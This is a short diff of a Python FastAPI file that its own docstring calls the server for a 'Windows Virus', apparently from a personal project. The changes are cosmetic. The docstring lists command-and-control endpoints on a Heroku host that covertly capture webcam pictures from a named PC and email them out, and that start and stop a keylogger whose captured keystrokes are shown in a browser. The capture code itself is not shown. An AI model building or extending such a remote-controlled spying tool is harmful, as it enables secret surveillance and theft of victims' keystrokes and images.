@@ -1,8 +1,6 @@
 """
-
     Ron Elmekiesse, 29.9.2020.
     This is the server for the Windows Virus, just run it as any python program (:
-
     The main server runs on heroku with the name "my-server-virus-commander".
 
     Commands:
@@ -10,7 +8,6 @@
     "https://my-server-virus-commander.herokuapp.com/{pc_name}/take_picture/{email_address_to_send}" -> will take a picture from you'r web cam and will send it to the email address given.
     "https://my-server-virus-commander.herokuapp.com/{pc_name}/start_key_logger" -> will start key logger on the pc_name given.
     "https://my-server-virus-commander.herokuapp.com/{pc_name}/stop_key_logger" -> will stop the key logger on the pc_name given and will display it on the browser.
-
 """
 
 from fastapi import FastAPI, Request
@@ -266,5 +263,5 @@ async def take_picture(pc_name: str):
 
 if __name__ == '__main__':
     # starting the server
-    #os.system("uvicorn App_FastAPI_Server:app --reload --port 8000")
+    #os.system("uvicorn App_FastAPI_Server:app --reload --port 8000") # if running locally.
     loop.run_forever()
